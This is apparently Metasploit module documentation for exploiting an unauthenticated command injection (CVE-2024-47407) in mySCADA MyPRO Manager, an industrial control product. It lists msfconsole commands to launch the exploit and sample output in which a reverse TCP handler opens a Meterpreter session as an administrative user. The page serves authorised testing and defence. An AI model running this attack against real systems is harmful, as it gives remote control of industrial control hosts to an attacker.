## Vulnerable Application

**Vulnerability Description**

This module exploits a command injection vulnerability in mySCADA MyPRO Manager <= v1.2 (CVE-2024-47407).

An unauthenticated remote attacker can exploit this vulnerability to inject arbitrary OS commands, which will get executed in the context of
`myscada9`, an administrative user that is automatically added by the product during installation.

Versions <= 1.2 are affected. CISA published [ICSA-24-326-07](https://www.cisa.gov/news-events/ics-advisories/icsa-24-326-07) to cover
the security issues. The official changelog from the vendor for the updated version is available
[here](https://www.myscada.org/docs/5-11-2024/).

**Vulnerable Application Installation**

A trial version of the software can be obtained from [the vendor](https://www.myscada.org/mypro/).

**Successfully tested on**

- mySCADA MyPRO Manager 1.2 on Windows 11 (10.0 Build 22621)

## Verification Steps

1. Install the application
2. After installation, reboot the system and wait some time until a runtime (e.g., 9.2.1) has been fetched and installed.
3. Start `msfconsole` and run the following commands:

```
msf6 > use exploit/windows/scada/mypro_mgr_cmd 
msf6 exploit(windows/scada/mypro_mgr_cmd) > set RHOSTS <IP>
msf6 exploit(windows/scada/mypro_mgr_cmd) > exploit 
```

You should get a meterpreter session in the context of `myscada9`.

## Scenarios

Running the exploit against MyPRO Manager v1.2 on Windows 11, using curl as a fetch command, should result in an output similar to the
following:

```
msf6 exploit(windows/scada/mypro_mgr_cmd) > exploit 

[*] Started reverse TCP handler on 192.168.1.227:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (201798 bytes) to 192.168.1.228
[*] Meterpreter session 1 opened (192.168.1.227:4444 -> 192.168.1.228:50472) at 2025-01-29 12:38:39 -0500
[*] Exploit finished, check thy shell.

meterpreter > getuid 
Server username: asdf\myscada9
meterpreter > sysinfo 
Computer        : asdf
OS              : Windows 11 (10.0 Build 22621).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows
```
